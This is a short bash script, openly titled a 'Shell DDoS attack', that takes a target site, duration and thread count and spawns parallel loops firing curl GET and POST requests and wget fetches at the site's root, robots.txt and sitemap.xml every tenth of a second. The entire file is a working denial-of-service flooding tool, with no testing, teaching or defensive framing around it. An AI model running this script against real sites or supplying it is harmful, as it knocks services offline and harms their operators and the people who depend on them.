#!/bin/bash

TARGET=$1
DURATION=$2
THREADS=$3

echo "Starting Shell DDoS attack on $TARGET"
echo "Duration: $DURATION seconds"
echo "Threads: $THREADS"

# Remove http/https and get domain only
TARGET=$(echo $TARGET | sed 's~http[s]*://~~g' | cut -d/ -f1)

attack_thread() {
    local thread_id=$1
    local end_time=$((SECONDS + DURATION))
    
    while [ $SECONDS -lt $end_time ]; do
        # Use curl with different attack methods
        curl -s -m 2 "http://$TARGET/" > /dev/null &
        curl -s -m 2 "http://$TARGET/robots.txt" > /dev/null &
        curl -s -m 2 "http://$TARGET/sitemap.xml" > /dev/null &
        curl -s -m 2 -X POST "http://$TARGET/" > /dev/null &
        wget -q -O /dev/null "http://$TARGET/" &
        
        sleep 0.1
    done
    wait
}

# Start multiple threads
for ((i=0; i<THREADS; i++)); do
    attack_thread $i &
done

wait
echo "Shell attack completed"